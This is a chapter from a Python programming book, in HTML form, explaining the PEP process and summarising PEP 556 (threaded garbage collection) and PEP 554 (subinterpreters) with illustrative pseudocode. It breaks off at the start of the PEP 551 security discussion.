<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:m="http://www.w3.org/1998/Math/MathML" xmlns:pls="http://www.w3.org/2005/01/pronunciation-lexicon" xmlns:ssml="http://www.w3.org/2001/10/synthesis">
<head>
  <meta charset="UTF-8"/>
  <title>Python Enhancement Proposals</title>
  <link type="text/css" rel="stylesheet" media="all" href="style.css"/>
  <link type="text/css" rel="stylesheet" media="all" href="core.css"/>
</head>
<body>
  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Python Enhancement Proposals</h1>
                </header>
            
            <article>
                
<p>In this chapter, we will look at <strong>P</strong><strong>ython Enhancement Proposals (PEPs)</strong>. PEPs are like <strong>Requests for Comments</strong> (<strong>RFCs</strong>); they allow interested parties to provide input on the path Python should take in the future. In this chapter, we will discuss the following:</p>
<ul>
<li>What are PEPs?</li>
<li>PEP 556 – Threaded garbage collection</li>
<li>PEP 554 – Multiple subinterpreters</li>
<li>PEP 551 – Security transparency</li>
<li>PEP 543 – Unified TLS API</li>
</ul>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Introduction</h1>
                </header>
            
            <article>
                
<p>Any programming language that is maintained requires regular updates to patch problems, as well as to provide new features. Python uses PEPs to propose new features, collect community input, and document design decisions. Thus, it is important to understand how the PEP process works, and to also look at some PEPs to see what they involve and their possible ramifications for the language.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">What are PEPs?</h1>
                </header>
            
            <article>
                
<p>PEPs are design documents that provide information to the Python community, describing new features (or proposed new features) for Python, its processes, or its environment. PEPs provide technical information, as well as the rationale for the document.</p>
<p>As used by the Python foundation, PEPs are the primary mechanism for communicating with the Python community as a whole. One requirement for PEP authorship is to build a consensus among the community members and document any dissenting opinions.</p>
<p>PEPs are kept as text files by the Python foundation, in a <strong>content versioning system</strong> (<strong>CVS</strong>). This versioning system acts as the historical record for each PEP, documenting the changes to the document, from first draft to final acceptance. As the CVS is based on GitHub, normal Git commands can be used to access documents, or they can be viewed via a browser at <a href="https://github.com/python/peps">https://github.com/python/peps.</a></p>
<p>Three types of PEP are available:</p>
<ul>
<li><strong>Standard track</strong>: These describe a new feature or implementation for Python. They are also used to describe standards for interoperability outside of the standard Python library for current versions; later PEPs will provide for support within the standard library. A good example of this is the <kbd>from __future__</kbd> module for Python 2, from when Python 3 was being developed.</li>
<li><strong>Information track</strong>: These describe Python design issues, or provide guidelines/information to the community, but they don't discuss new feature proposals. These PEPs don't require community consensus, nor are they official recommendations, so Python users are free to use or ignore informational PEPs, as desired.</li>
<li><strong>Process tracks</strong>: These describe a Python process or propose a change to a process. They are similar to Standard PEPs, but are applicable to areas outside of the Python language itself. They frequently require community consensus before implementation, and, because they are more than just informational, they generally require adherence. They make changes to the Python ecosystem, not the language, so the implications can affect how the language is used.</li>
</ul>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>As this is more of a procedural chapter than a coding chapter, this section will discuss the process of creating, submitting, and maintaining a PEP:</p>
<ol>
<li><span>Like many great things, the first step to creating a PEP is developing a new idea for Python. Just like the Unix environment expects programs to do one thing only, PEPs should only explain one key idea. Small improvements, such as enhancements or patches, typically don't need a full PEP, and can be submitted into the Python development process through a ticket submission.</span></li>
<li class="standard">The most successful PEPs hone in on one focused topic, and PEP editors have the right to reject PEPs that they consider too broad in topic or unfocused in their proposal. If a submitter has any doubts, it is better to submit multiple PEPs than try to discuss many overlapping ideas.</li>
<li class="standard">Every PEP must have a champion—the person who will write the PEP using the prescribed format, monitor and manage discussions about the PEP, and build the community consensus for the PEP. While the PEP champion is normally the author, it doesn't have to be, as in the case of an organization making a PEP; the champion is simply the person who advocates for the PEP the most.</li>
<li>Prior to drafting a PEP, interest in the idea should be determined; obviously, trying to champion an unwanted idea is an uphill battle and could potentially lead to backlash. The best way to solicit interest is by posting to some of the core Python contact groups via <kbd>python-list@python.org</kbd><span>&#160;or</span> <kbd>python-ideas@python.org</kbd><span>. Obviously, there are many other Python forums, blogs, and other community locales online, but those are considered the official solicitation sites.</span></li>
<li>One of the benefits of judging community interest prior to drafting the PEP is to ensure the idea hasn't already been rejected before; internet searches aren't guaranteed to find all of the ideas that have been proposed in the past. It also ensures that the idea has merit within the community and isn't just a pet-project.</li>
<li>Once the community has been canvassed and the idea is deemed good enough for a PEP, a draft PEP should be created and submitted to the <kbd>python-ideas</kbd> mailgroup. This allows the author to ensure the document is properly formatted and gain feedback prior to formal submission.</li>
<li>To actually submit a PEP to the Python GitHub site, a pull request must be made:</li>
</ol>
<ul>
<li>
<ul>
<li>First, fork the PEP repository and create a file named <kbd>pep-9999.rst</kbd><span>. This is the file that will contain your PEP document.</span></li>
<li>Push this to your GitHub fork and submit a pull request.</li>
<li>The PEP will be reviewed by the editors for formatting and structure.</li>
<li>If approved, the PEP will receive a formal PEP number and be assigned to one of the three tracks, as appropriate. It will also receive the <em>Draft</em> status.</li>
</ul>
</li>
</ul>
<ol start="8">
<li>Reasons for a PEP not being approved include duplicate submission (normally, a similar idea was submitted by someone else), being deemed technically unsound or unfeasible, insufficient motivation for the PEP, lack of backwards compatibility (obviously, this is not relevant between Python 2 and Python 3), or not keeping with the Python philosophy.</li>
<li>As updates are made to a PEP, the changes can be checked in by a developer with git push permissions.</li>
<li>After an official PEP number has been assigned, the draft PEP can be discussed on the <kbd>python-ideas</kbd> mailgroup. Eventually, however, standard track PEPs must be sent to the <kbd>python-dev</kbd> list for review.</li>
<li>Standard track PEPs comprise two parts: a design document, and a reference implementation. It is suggested that a prototype implementation be submitted with the PEP as a sanity check, to show that the idea is feasible.</li>
<li>Once the PEP is complete and ready for final submission, final consideration is made by Guido van Rossum, the leader of the Python Foundation, or one of his selected cadre. For a PEP to be accepted, it must have a complete description of the proposal, the proposed enhancement must be an improvement for the Python language or ecosystem, any interpreter implementations must not affect performance or capabilities or otherwise interfere with operations, and the implementation must meet the pythonic sensibilities of Guido van Rossum.</li>
<li>Once a PEP has been accepted, the reference implementation is completed and incorporated into the main Python code repository. At that point, the PEP will be labeled <em>Finished</em>. Other status markers include: <em>Deferred</em> (PEP progress is put on hold), <em>Rejected</em> (PEP is declined by Van Rossum), and <em>Withdrawn</em>&#160;(PEP is removed from the pipeline by the author).</li>
</ol>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>The required parts for a PEP to be accepted include the following:</p>
<ul>
<li><strong>A preamble</strong>: This includes the PEP number, a short title, the names of others, and so on.</li>
<li><strong>Abstract</strong>: A short description of the issue addressed in the PEP.</li>
</ul>
<ul>
<li><strong>License</strong>: Each PEP must be either placed in the public domain or licensed under the Open Publication License.</li>
<li><strong>Specification</strong>: Technical specs that describe the syntax and semantics of new language features, detailed enough to allow interoperable implementations in alternate Python implementations, that is, CPython, Jython, IronPython, PyPy, and so on.</li>
<li><strong>Motivation</strong>: Why the author created the PEP, and what inadequacies currently exist in the Python ecosystem.</li>
<li><strong>Rationale</strong>: This expands on the specification by describing the motivation behind the PEP and why certain decisions were made regarding the implementation. It includes a discussion of alternative designs considered and related work, such as how this feature is implemented in other languages. There should also be evidence of community consensus and important issues raised within the community during the discussion process.</li>
<li><strong>Backwards&#160;compatibility</strong><span>: Any known issues regarding backwards compatibility are addressed in this section. Proposed fixes for these incompatibilities must be included; not accounting for (or including insufficient) methods may result in immediate rejection of the PEP.</span></li>
<li><strong>Reference implementation</strong>: Although it is not necessary during the draft and comments period, a final implementation must be provided prior to a PEP receiving <em>Final</em> status. The implementation must include all relevant test code and documentation for inclusion in the Python language reference or standard library reference.</li>
</ul>
<p>PEPs are written in reStructuredText (such as Python docstrings), which allows them to be human-readable, yet easily parsed into HTML.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">PEP 556 –&#160;Threaded garbage collection</h1>
                </header>
            
            <article>
                
<p>PEP 556 and the following PEPs are included to show recent PEP submissions that are potentially interesting, due to their impact on the Python ecosystem.</p>
<p>PEP 556 was created in September, 2017, and is currently in <em>Draft</em> status. It is expected to be included in Python v3.7. It proposes a new mode of operation for Python's garbage collection. The new mode would allow implicit collection to occur within a dedicated thread, rather than synchronously with the CPU.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>To discuss this PEP, we need to have a discussion about how garbage collection works within Python.</p>
<p>Garbage collection is handled by the <kbd>gc</kbd> module. While garbage collection is provided by Python by default, it is actually an optional feature. Using the module, garbage collection can be turned off, or the collection frequency can be modified; it also allows for debugging options. Further, it provides the ability to access objects that the collector identified, but cannot directly de-allocate. Python's garbage collector acts in conjunction with reference counting, which is one reason why it can be turned off.</p>
<p>Implicit garbage collection occurs based on the system determining that resources are over-allocated. When a new allocation request is made, the system reviews the program stats to determine which objects can be collected to allow the new resource to be made.</p>
<p>Explicit garbage collection occurs when a programmatic collection call is made via the Python API, for example,&#160;<kbd>gc.collect</kbd>. While this can be done by the programmer, such as when a file is explicitly closed, it can also occur from the underlying interpreter when an object is no longer being referenced.</p>
<p>Historically, the Python garbage collector has operated synchronously when performing implicit collections. This results in the program execution pausing within the current thread and running the garbage collector.</p>
<p>The problem comes from the fact that, when reclaiming resources, finalization code within the objects may be executed, such as <kbd>__del__</kbd> methods and weak references. Weak references to objects do not keep these objects <em>alive</em> enough to prevent garbage collection. If the only remaining references to an object are weak, then the garbage collector is free to destroy the object and reallocate its resources. Until the object is destroyed, any weak references can call and return the referenced object, regardless of whether there are strong references available.</p>
<p>Weak references are commonly used to implement a cache or map of large objects, when the need to keep the large object around just because it is referenced by the cache or map isn't necessary. In other words, weak references allow large objects to be removed from memory once they are no longer actively used; if the object is cached or mapped to associations, there is no need to keep it around, as those references don't have a primary affect on the object.</p>
<p>When finalization code exists to clean up the system when an object is closed and dereferenced, the active thread is paused until the finalization process is complete; for example, notifying other objects, or even other systems, that the object is no longer available. Pausing running code to handle these housekeeping chores can result in an internal state that causes problems when the code is restarted.</p>
<p>Hence, this PEP is aimed at this thread-state problem. When the running thread is paused and then restarted, it is fundamentally more difficult to deal with, rather than in multithreaded synchronization, where control is just switched between threads.&#160;Rather than forcing the developer to deal with problems that crop up when reentering the original thread, every time the thread is paused, this PEP addresses the issue by allowing garbage collection to occur in a separate thread, thus allowing the use of well-established multithreading principles.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>As this is a PEP, there is no real code to create, unlike in previous chapters. What we will do is cover the details of the proposal and how they are intended to be implemented:</p>
<ol>
<li>Two new APIs would be added to the <kbd>gc</kbd> module:
<ul>
<li><span>The&#160;<kbd>gc.set_mode(mode)</kbd></span>&#160;API&#160;<span>configures the garbage-collection mode between serial and threaded. If it is currently set to threaded, but the setting is switched to serial, the function waits for the garbage collection thread to complete before changing.</span></li>
<li><span>The&#160;<kbd>gc.get_mode()</kbd></span>&#160;API&#160;<span>returns the current mode of operation.</span></li>
</ul>
</li>
<li>The collection mode can be switched between the two options, so it is recommended that it be set at the beginning of a program, or when child processes are created.</li>
<li>The actual implementation happens through adding the flag <kbd>gc_is_threaded</kbd> to the <kbd>gc</kbd> module; internally, a thread lock is added, to prevent multiple garbage collection instances from running simultaneously.</li>
<li>In addition, two private functions, <kbd>threading._ensure_dummy_thread(name)</kbd> and <kbd>threading._remove_dummy_thread(thread)</kbd>, are added to the <kbd>threading</kbd> module. The former creates a thread with the provided name, whereas the latter removes the thread from the module's internal state.<br/>
These functions allow the current thread to provide the name of the garbage collection thread when called within a finalization callback.</li>
</ol>
<ol start="5">
<li>Pseudocode is provided, demonstrating how the actual code would be implemented in the <kbd>gc</kbd> Python module as C code:</li>
</ol>
<ul>
<li>
<ul>
<li><kbd>callback_collect.txt</kbd> simply enhances the current function by running garbage collection, up to the current object generation:</li>
</ul>
</li>
</ul>
<pre>                  def collect_with_callback(generation):<br/>                      """<br/>                      Collect up to the given *generation*.<br/>                      """<br/>                      # Same code as currently <br/>                      # (see collect_with_callback() in gcmodule.c)</pre>
<ul>
<li>
<ul>
<li><kbd>collect_gens.txt</kbd> is much the same, as it doesn't modify the existing functionality. It is designed to collect all objects, as determined by the heuristic algorithm:</li>
</ul>
</li>
</ul>
<pre>                  def collect_generations():<br/>                      """<br/>                      Collect as many generations as desired <br/>                      by the heuristic.<br/>                      """<br/>                      # Same code as currently <br/>                      # (see collect_generations() in gcmodule.c)</pre>
<ul>
<li>
<ul>
<li><kbd>lock_collect.txt</kbd> demonstrates how garbage collection will be handled in a thread-safe manner; that is, the thread is locked during collection:</li>
</ul>
</li>
</ul>
<pre>                  def lock_and_collect(generation=-1):<br/>                      """<br/>                      Perform a collection with thread safety.<br/>                      """<br/>                      me = PyThreadState_GET()    <br/>                      if gc_mutex.owner == me:<br/>                          # reentrant GC collection request, bail out<br/>                          return<br/>                  Py_BEGIN_ALLOW_THREADS    <br/>                  gc_mutex.lock.acquire()<br/>                  Py_END_ALLOW_THREADS<br/>                  gc_mutex.owner = me<br/>                  try:<br/>                      if generation &gt;= 0:<br/>                          return collect_with_callback(generation)<br/>                      else:<br/>                          return collect_generations()<br/>                  finally:<br/>                      gc_mutex.owner = NULL<br/>                      gc_mutex.lock.release()</pre>
<ul>
<li>
<ul>
<li><kbd>sched_gc.txt</kbd> ensures that garbage collection is in the threaded mode, and then requests the collection of resources, when available:</li>
</ul>
</li>
</ul>
<pre>                  def schedule_gc_request():<br/>                      """<br/>                      Ask the GC thread to run an implicit collection.<br/>                      """<br/>                      assert gc_is_threaded == True<br/>                      # Note this is extremely fast <br/>                      # if a collection is already requested<br/>                      if gc_thread.collection_requested == False:<br/>                          gc_thread.collection_requested = True<br/>                          gc_thread.wakeup.release()</pre>
<ul>
<li>
<ul>
<li><kbd>implicit_gc.txt</kbd> doesn't modify the existing code. It simply calls for collection if the heuristic algorithm determines it is necessary:</li>
</ul>
</li>
</ul>
<pre>                  def is_implicit_gc_desired():<br/>                      """<br/>                      Whether an implicit GC run is currently desired based <br/>                      on allocation stats. Return a generation number, <br/>                      or -1 if none desired.<br/>                      """<br/>                      # Same heuristic as currently <br/>                      # (see _PyObject_GC_Alloc in gcmodule.c)</pre>
<ul>
<li>
<ul>
<li><kbd>gc_malloc.txt</kbd> allocates the memory resources to support a garbage collection object:</li>
</ul>
</li>
</ul>
<pre>                  def PyGC_Malloc():<br/>                      """<br/>                      Allocate a GC-enabled object.<br/>                      """<br/>                      # Update allocation statistics (same code <br/>                      # as currently, omitted for brevity)<br/>                      if is_implicit_gc_desired():<br/>                          if gc_is_threaded:<br/>                              schedule_gc_request()<br/>                          else:<br/>                              lock_and_collect()<br/>                      # Go ahead with allocation (same code as currently, <br/>                      # omitted for brievity)</pre>
<ul>
<li>
<ul>
<li><kbd>gc_thread.txt</kbd> spawns the garbage collection thread when called for:</li>
</ul>
</li>
</ul>
<pre>                  def gc_thread(interp_state):<br/>                      """<br/>                      Dedicated loop for threaded GC.<br/>                      """<br/>                      # Init Python thread state <br/>                      # (omitted, see t_bootstrap in _threadmodule.c)<br/>                      # Optional: init thread in Python threading module, <br/>                      # for better introspection<br/>                      me = threading._ensure_dummy_thread(name="GC thread")<br/>                      while gc_is_threaded == True:<br/>                          Py_BEGIN_ALLOW_THREADS<br/>                          gc_thread.wakeup.acquire()<br/>                          Py_END_ALLOW_THREADS<br/>                          if gc_thread.collection_requested != 0:    <br/>                              gc_thread.collection_requested = 0<br/>                               lock_and_collect(generation=-1)<br/>                      threading._remove_dummy_thread(me)<br/>                      # Signal we're exiting<br/>                      gc_thread.done.release()<br/>                      # Free Python thread state (omitted)</pre>
<ul>
<li>
<ul>
<li><kbd>gc_set_mode.txt</kbd> actually sets the garbage collection mode, between serial and threaded:</li>
</ul>
</li>
</ul>
<pre>                    def gc.set_mode(mode):<br/>                        """<br/>                        Set current GC mode. <br/>                        This is a process-global setting.<br/>                        """<br/>                        if mode == "threaded":<br/>                            if not gc_is_threaded == False:<br/>                                # Launch thread<br/>                                gc_thread.done.acquire(block=False) <br/>                                # should not fail<br/>                                gc_is_threaded = True<br/>                                    PyThread_start_new_thread(gc_thread)<br/>                        elif mode == "serial":<br/>                            if gc_is_threaded == True:<br/>                                # Wake up thread, asking it to end<br/>                                gc_is_threaded = False<br/>                                gc_thread.wakeup.release()<br/>                                # Wait for thread exit    <br/>                                Py_BEGIN_ALLOW_THREADS<br/>                                gc_thread.done.acquire()<br/>                                Py_END_ALLOW_THREADS<br/>                                gc_thread.done.release()<br/>                        else:<br/>                            raise ValueError("unsupported mode %r" %<br/>                                             (mode,))</pre>
<ul>
<li>
<ul>
<li><kbd>gc_get_mode.txt</kbd> is a getter function that simply reports whether the garbage collector is threaded or serial:</li>
</ul>
</li>
</ul>
<pre>                   def gc.get_mode(mode):<br/>                       """<br/>                       Get current GC mode.<br/>                       """<br/>                       return "threaded" if gc_is_threaded else "serial"</pre>
<ul>
<li>
<ul>
<li><kbd>gc_collect.txt</kbd> represents a simple function that locks the thread and calls for garbage collection of the current object generation:</li>
</ul>
</li>
</ul>
<pre>                   def gc.collect(generation=2):<br/>                       """<br/>                       Schedule collection of the given generation <br/>                       and wait for it to finish.<br/>                       """<br/>                       return lock_and_collect(generation)</pre>
<p>Again, all of the preceding code is just pseudocode, representing how the C code would be implemented in the Python interpreter. It is not production code, and any attempt to use it as-is will fail.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>The reason the default mode for garbage collection isn't changed to handle threads is because, while it would work for programs that are already multithreaded, single-threaded programs see finalization calls within the main thread. Changing this behavior may result in bugs in the program, related to finalizers existing outside of the main thread.</p>
<p>It also causes problems if the program is written to use forking for concurrency. Forking from a single-threaded program is fine, as that is its intended use, but when forking from a multithreaded program, errors can creep into the system.</p>
<p>Due to compatibility issues, garbage collection currently waits for the collection process to end before the main thread is recalled. Thus, while it may make sense to have explicit collection on a separate thread as well as implicit collection, it wouldn't really alleviate any synchronization issues when the thread restarts.</p>
<p>Inherent in the nature of multithreading, using a threaded garbage collector results in a slight delay for implicit collections when compared to serial collection. This delay may affect the system's memory allocation profile for some applications, but is expected to be minimal.</p>
<p>Since the pseudocode shows thread locking in several places, there could be implications for CPU usage. However, it is far more expensive, in terms of processing power, to crawl the chain of object pointers during the garbage collection process itself. Such crawling is almost a brute-force process, and doesn't lend itself easily to CPU speculation, superscalar execution, and other marvels of modern CPU design.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">PEP 554 –&#160;Multiple subinterpreters</h1>
                </header>
            
            <article>
                
<p>PEP 554 was created in September, 2017, and is currently in <em>Draft</em> status. It is projected for inclusion in Python v3.8. This PEP discusses the potential of creating an <kbd>interpreters</kbd> module, allowing access to multiple interpreters within the same process.</p>
<p>Multiple interpreters, also known as subinterpreters, have been a feature of Python since version 1.5. While most developers are aware of the normal Python interpreter, either through the interactive Python console or simply by executing code, there is the ability to support multiple, independent interpreters within the same process, and, if needed, within the same thread. The subinterpreters can be switched between by using the <kbd>PyThreadState_Swap()</kbd> function.</p>
<p>Each subinterpreter is a nearly complete, separate Python environment for code execution. Each interpreter has separate and independent versions of all import modules, system paths, and even <kbd>STDIN</kbd>, <kbd>STDOUT</kbd>, and <kbd>STDERR</kbd> streams. Extension modules can be shared between subinterpreters by making shallow copies of the module's initialization dictionary; that is, the module is effectively a single, copied instance between the subinterpreters, rather than re-initialized each time.</p>
<p>What this PEP aims to accomplish is to make subinterpreters a part of the Python standard library by providing high-level interfaces to the subinterpreters, much like the current <kbd>threading</kbd> module. The module will also allow for data sharing between each interpreter, rather than object sharing; that is, while objects are independent in each interpreter, they can still share data between themselves, (again, like threads).</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How to do it...</h1>
                </header>
            
            <article>
                
<p>Again, this section will present pseudocode provided in the PEP, though it looks like Python code, to demonstrate how the PEP would work:</p>
<ol>
<li><kbd>interpreter_isolate.txt</kbd> demonstrates running code in an isolated manner within an interpreter:</li>
</ol>
<pre style="color: black">        interp = interpreters.create()<br/>        print('before')<br/>        interp.run('print("during")')<br/>        print('after')</pre>
<ol start="2">
<li><kbd>interpreter_spawn_thread.txt</kbd> shows an interpreter spawning a thread to run Python code:</li>
</ol>
<pre style="color: black">        interp = interpreters.create()<br/>        def run():<br/>            interp.run('print("during")')<br/>        t = threading.Thread(target=run)<br/>        print('before')<br/>        t.start()<br/>        print('after')</pre>
<ol start="3">
<li>In <kbd>interpreter_prepopulate.txt</kbd>, an interpreter is pre-populated with imported modules, which are initialized; then, the interpreter waits for a call to actually do the work:</li>
</ol>
<pre style="color: black">        interp = interpreters.create()<br/>        interp.run(tw.dedent("""<br/>            import some_lib<br/>            import an_expensive_module<br/>            some_lib.set_up()<br/>        """))<br/>        wait_for_request()    <br/>        interp.run(tw.dedent("""<br/>            some_lib.handle_request()<br/>        """))</pre>
<ol start="4">
<li><kbd>interpreter_exception.txt</kbd> shows an interpreter handling an exception, which isn't much different from normal operation, other than having a new interpreter created:</li>
</ol>
<pre style="color: black">        interp = interpreters.create()<br/>        try:<br/>            interp.run(tw.dedent("""<br/>                raise KeyError<br/>            """))<br/>        except KeyError:<br/>            print("got the error from the subinterpreter")</pre>
<ol start="5">
<li><kbd>interpreter_synch.txt</kbd> demonstrates the creation of two subinterpreters, and synchronizing between them with a data channel:</li>
</ol>
<pre style="color: black">        interp = interpreters.create()<br/>        r, s = interpreters.create_channel()<br/>        def run():<br/>            interp.run(tw.dedent("""<br/>                reader.recv()<br/>                print("during")<br/>                reader.close()<br/>                """),<br/>                shared=dict(<br/>                    reader=r,<br/>                ),<br/>            )<br/>            t = threading.Thread(target=run)<br/>            print('before')<br/>            t.start()<br/>            print('after')<br/>            s.send(b'')<br/>            s.close()</pre>
<ol start="6">
<li><kbd>interpreter_data_share.txt</kbd> shows several interpreters being created and sharing file data:</li>
</ol>
<pre style="color: black">        interp = interpreters.create()<br/>        r1, s1 = interpreters.create_channel()<br/>        r2, s2 = interpreters.create_channel()<br/>        def run():<br/>            interp.run(tw.dedent("""<br/>                fd = int.from_bytes(<br/>                    reader.recv(), 'big')<br/>                for line in os.fdopen(fd):<br/>                    print(line)<br/>                writer.send(b'')<br/>                """),<br/>                shared=dict(<br/>                    reader=r,<br/>                    writer=s2,<br/>                ),<br/>            )<br/>            t = threading.Thread(target=run)<br/>            t.start()<br/>            with open('spamspamspam') as infile:<br/>                fd = infile.fileno().to_bytes(1, 'big')<br/>                s.send(fd)<br/>                r.recv()</pre>
<ol start="7">
<li><kbd>interpreter_marshal.txt</kbd> demonstrates object passing via <kbd>marshal</kbd>. Marshaling data is similar to pickling or shelving, but, whereas those two modules are designed for general objects, <kbd>marshal</kbd> is designed for Python-compiled code in <kbd>.pyc</kbd> files:</li>
</ol>
<pre style="color: black">        interp = interpreters.create()<br/>        r, s = interpreters.create_fifo()<br/>        interp.run(tw.dedent("""<br/>            import marshal<br/>            """),<br/>            shared=dict(<br/>                reader=r,<br/>            ),<br/>        )<br/>        def run():<br/>            interp.run(tw.dedent("""<br/>                data = reader.recv()<br/>                while data:<br/>                    obj = marshal.loads(data)<br/>                    do_something(obj)<br/>                    data = reader.recv()<br/>                reader.close()<br/>            """))<br/>            t = threading.Thread(target=run)<br/>            t.start()<br/>            for obj in input:<br/>                data = marshal.dumps(obj)<br/>                s.send(data)<br/>            s.send(None)</pre>
<ol start="8">
<li><kbd>interpreter_pickle.txt</kbd> shows subinterpreters sharing serialized data using <kbd>pickle</kbd><em>:</em></li>
</ol>
<pre style="color: black">        interp = interpreters.create()<br/>        r, s = interpreters.create_channel()<br/>        interp.run(tw.dedent("""<br/>            import pickle<br/>            """),<br/>            shared=dict(<br/>                reader=r,<br/>            ),<br/>        )<br/>        def run():<br/>            interp.run(tw.dedent("""<br/>                data = reader.recv()<br/>                while data:<br/>                    obj = pickle.loads(data)<br/>                    do_something(obj)<br/>                    data = reader.recv()<br/>                reader.close()<br/>            """))<br/>            t = threading.Thread(target=run)<br/>            t.start()<br/>            for obj in input:<br/>                data = pickle.dumps(obj)<br/>                s.send(data)<br/>            s.send(None)</pre>
<ol start="9">
<li><kbd>subinterpreter_module.txt</kbd> simply shows how to use a subinterpreter to run a module:</li>
</ol>
<pre style="color: black">        interp = interpreters.create()<br/>        main_module = mod_name<br/>        interp.run(f"import runpy; runpy.run_module({main_module!r})')</pre>
<ol start="10">
<li><kbd>subinterpreter_script.txt</kbd>, similar to <kbd>subinterpreter_module.txt</kbd> in the preceding code, has an interpreter running a script. This could also be used for zip archives and directories:</li>
</ol>
<pre style="color: black">        interp = interpreters.create()<br/>        main_script = path_name<br/>        interp.run(f"import runpy; runpy.run_path({main_script!r})")</pre>
<ol start="11">
<li><kbd>subinterpreter_pool.txt</kbd> shows several subinterpreters being spawned to create a pool, then executing code using a thread executor:</li>
</ol>
<pre style="color: black">        interps = [interpreters.create() for i in range(5)]<br/>        with concurrent.futures.ThreadPoolExecutor(max_workers=len(interps)) as pool:<br/>            print('before')<br/>            for interp in interps:<br/>                pool.submit(interp.run, 'print("starting"); print("stopping")'<br/>            print('after')</pre>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">How it works...</h1>
                </header>
            
            <article>
                
<p>The concept of multiple interpreters is not dissimilar to multiprocessing. Each interpreter is (relatively) isolated from the others, like multiple processes; yet, externally, the system appears to be running just a single process. This means that system performance and resource use are significantly better than in true multiprocessing.</p>
<p>It also increases the security profile of the system, because there is some leakage between the different interpreters, such as file descriptors, built-in types, singletons, and underlying static module data. They don't require modifications to the isolation of processes to pass data or otherwise interact with the system.</p>
<p>Another benefit of subinterpreters is that they provide a method of Python concurrency that allows for the simultaneous use of multiple CPUs (like multiprocessing) while functioning like independent, isolated threads, which is currently prevented, due to the GIL. Hence, while there is some overlap with existing programming methods, it could provide an alternate form of concurrency, without the problems of other parallel processing paradigms.</p>
<p>Subinterpreters provide improved security because, by nature, they are isolated from each other, with each interpreter having its own memory block to play with. This contrasts with threads, which have a shared memory pool, by design, to facilitate data communications.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Channels</h1>
                </header>
            
            <article>
                
<p>Subinterpreters are able to share data via channels; the Go language does this as well, as the concept comes from <strong>Communicating Sequential Processes</strong> (CSP), which describes interactions within concurrent systems.</p>
<p>Channels provide two modes: send and receive. In Python's case, one interpreter opens a channel to another. When data is sent, it is actually data derived from an object; when it is received, that data is converted back into the original object. In this way, objects can be passed between different interpreters without actually having access to the objects themselves.</p>
<p>Implicit calls to channels are accomplished via <kbd>send()</kbd>, <kbd>recv()</kbd><em>,</em> and <kbd>close()</kbd> calls. This eliminates the need for explicit functions&#160;such as&#160;<kbd>add_channel()</kbd> and <kbd>remove_channel()</kbd> on an interpreter object, which would just add extraneous functionality to the Python API.</p>
<p>Channels allow many-to-many connections between interpreters, whereas normal data pipes only support one-to-one connections. Both are FIFO data transfers, so the simplicity of using pipes eliminates the ability to handle simultaneous data transfers between multiple interpreters. Pipes also require naming the pipes, whereas channels are simply available for use.</p>
<p>Data queues and channels are very similar, with the main difference being that queues allow data buffering. However, this would cause problems with the sending and receiving of channel data, as channels support process blocking, so queues were determined to not be a viable solution for subinterpreter communications. Plus, queues can be built using channels, if their functionality is necessary.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">There's more...</h1>
                </header>
            
            <article>
                
<p>The only documented use of subinterpreters is in <kbd>mod_wsgi</kbd> and <strong>Java Embedded Python (JEP)</strong>. This is possibly due to their hidden nature. Though multiple interpreters have been available since the early days of Python, and they provide a number of features comparable to multithreading and multiprocessing, they simply aren't commonly used. To be honest, this author wasn't aware of them until finding this PEP, but they sound very useful for certain parallel-processing projects.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">PEP 551 –&#160;Security transparency</h1>
                </header>
            
            <article>
                
<p>PEP 551 is from August, 2017, and is in <em>Draft&#160;</em>status; it is also expected to be implemented in version 3.7. It is designed to improve visibility into Python's behavior through security tools. Specifically, it attempts to prevent malicious uses of Python, to detect and report malicious use, and to detect attempts to bypass detection. The caveat is that this PEP would require user intervention, in the sense that they would be responsible for customizing and building Python for their particular environment.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Getting ready</h1>
                </header>
            
            <article>
                
<p>Some discussion of software security is required before delving into the specifics of this PEP. This ensures that a common level of knowledge is available to readers.</p>


            </article>

            
        </section>
    </div>


  <div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">General security</h1>
                </header>
            
            <article>
                
<p>In software, many vulnerabilities are due to bugs that allow remote code execution or privilege escalation. One of the worst vulnerabilities is the <strong>advanced persistent threat</strong> (<strong>APT</strong>). An APT occurs when an attacker gains access to a network, installs software on one or more systems, then uses that software to retrieve data from the network, such as passwords, financial information, and so on. While most APTs attempt to hide their activity, ransomware and hardware attacks are notable for being very <em>loud and proud</em> in announcing that they are on the network.</p>
